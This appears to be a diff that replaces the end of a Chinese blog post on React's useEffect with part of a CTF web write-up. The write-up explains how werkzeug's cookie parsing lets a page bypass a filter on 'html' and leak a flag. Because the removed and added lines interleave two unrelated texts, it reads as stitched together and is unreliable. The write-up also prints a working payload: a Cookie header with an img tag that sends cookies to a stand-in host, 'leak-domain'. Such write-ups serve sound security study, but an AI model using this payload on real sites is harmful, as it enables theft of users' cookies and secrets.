@@ -1,34 +1,80 @@
-## 總結
+if settings:
+        res = make_response(render_template("index.html",
+            backgroundColor=settings["backgroundColor"] if "backgroundColor" in settings else "#ffde8c",
+            textColor=settings["textColor"] if "textColor" in settings else "#000000",
+            html=settings["html"] if "html" in settings else ""
+        ))
+    else:
+        res = make_response(render_template("index.html", backgroundColor="#ffde8c", textColor="#000000"))
+        res.set_cookie("settings", "{}")
 
-其實這篇我想討論的重點並不在 redux，也不在到底要從哪裡去 call API，這些都是其次。
+    return res
+```
 
-重點是對 useEffect 這個 hook 的理解。
+Python 這邊主要會根據 cookie 內的參數來 render 頁面，template 如下：
 
-我對它的理解就是：「當 dependencies 改變之後要執行什麼 side effect，就寫在裡面」。
+``` html
+<iframe
+  id="render"
+  sandbox=""
+  srcdoc="<style>* { text-align: center; }</style>{{html}}"
+  width="70%"
+  height="500px">
+</iframe>
+```
 
-從這點延伸出去，就會有我上面所提的 reactive 的寫法：「當 state 改變以後，我要做些什麼」。
+就算控制了 html，也只能在 sandbox iframe 裡面，不能執行程式碼，也不是 same origin。但以往如果要偷 cookie 的話，基本上都需要先有 same-origin 的 XSS 才行。
 
-最後呢，有關於這些 hook 的東西，我首推 dan 哥的兩篇文章，寫得真的很讚：
+而前端的部分可以設定 cookie，但會過濾掉 `html` 這個字，所以不讓你設定 html：
 
-1. [How Are Function Components Different from Classes?](https://overreacted.io/how-are-function-components-different-from-classes/)
-2. [A Complete Guide to useEffect](https://overreacted.io/a-complete-guide-to-useeffect/)
+``` js
+const saveSettings = (settings) => {
+    document.cookie = `settings=${settings}`;
+}
 
-這篇記錄了一下我對 useEffect 的理解，有什麼問題都可以再找我討論。
+const getSettings = (d) => {
+    try {
+        s = JSON.parse(d);
+        delete s.html;
+        return JSON.stringify(s);
+    } catch {
+        while (d != d.replaceAll("html", "")) {
+            d = d.replaceAll("html", "");
+        }
+        return d;
+    }
+}
 
-## 後記（於 2020-09-10 補充）
+window.onload = () => {
+    const params = (new URLSearchParams(window.location.search));
+    if (params.get("settings")) {
+        window.settings = getSettings(params.get("settings"));
+        saveSettings(window.settings);
+        renderSettings(window.settings);
+    } else {
+        window.settings = getCookie("settings");
+    }
+    window.settings = JSON.parse(window.settings);
+```
 
-文章發出之後，經[社團](https://www.facebook.com/groups/reactjs.tw/permalink/2725146031094311/?__cft__[0]=AZXWpC3mxMQ4Ucyj0n6JXK7gGPPqb1GzcjZG0rCwbGXkOcuMCCn_PzeZHTNfpH0s9hq8rHBL_h5QQ2QqzD3X_9yqa_kopA4qMhOzcIKV7-lIXe8ftgtwLCQZX9_W4-Q0h-5iFLPIQuaXQmbWcwnwI_UM18_37Nf5fiG9V1HuNOjxzs7wldMgkBUfwFnT6I9uvxc&__tn__=%2CO%2CP-R)中有人提醒才突然察覺到，其實我這篇講的只是 useEffect 的其中一個部分而已。
+那這題到底要怎麼解呢？這一切都與 werkzeug 解析 cookie 時的邏輯有關。
 
-useEffect 沒有那麼複雜，就只是「function component render 之後會執行的 side effect」，就這樣而已。甚至可以跟 state 一點關係都沒有。我後來想想，覺得這樣的確才是對 useEffect 的正確理解。
+先來講如何繞過那個 html 的檢查，在 werkzeug 裡面如果你的 cookie value 是用 `""` 包住的話，會先進行 decode，因此 `"\150tml"`  會被 decode 成 `"html"`，就可以繞過對於 html 關鍵字的檢查。
 
-至於這篇文章中所提到的，可以說是 useEffect 的其中一個應用方式。
+但繞過之後，要怎麼拿到 flag 呢？這就要用到 werkzeug 第二個解析 cookie 的特殊之處了。當 werkzeug 在解析 cookie 時，如果碰到 `"` 時，就會解析到下一個 `"` 為止。
 
-因為 useEffect 的第二個參數可以指定「在哪些 dependencies 有變動的時候，我才想執行這個 side effect」，然後你在 dependencies 之中可以放 state，那就變成這篇文章所說的：「當 state 改變以後，我想做些什麼」。所以這篇提的只是 useEffect 的其中一個用法而已，並沒有看到 useEffect 的全貌。
+舉例來說，假設 cookie 的內容是這樣：
 
-useEffect 就是：「function component render 之後，會執行的 side effect」。
+```
+Cookie: cookie1="abc; cookie2=def";
+```
 
-而文章中提的用法，就只是把 useEffect 加上 dependencies，變成：「function component render 之後，『如果 state 改變了』，會執行的 side effect」。
+最後得到的結果會是：`"cookie1": "abc; cookie2=def"`
 
-另外，其實上面那句用「如果 state 改變了」也沒有到那麼精確，因為在 didMount 的時候也會執行 useEffect，但那時候 state 並沒有變，還是初始值。所以更精確的講法或許是：「function component render 之後，如果是 didMount 或是 state 改變了，會執行的 sideEffect」。
+也就是說，如果我們在 flag 的前後各夾一個 cookie，就可以讓 flag 包含在 html 裡面，讓 flag 的內容出現在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload：
 
-感謝[陳冠霖](https://medium.com/@as790726)的指正。
+```
+Cookie: settings="{\"\150tml\": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>\"}"
+```
+
+看完這題才突然想到以前 DiceCTF 2023 也出現過類似的題目，那時候是 jetty 有這個行為：[Web - jnotes (6 solves)](https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/#web-jnotes-6-solves)，看來搞不好還不少 web framework 有這個 parsing 行為。
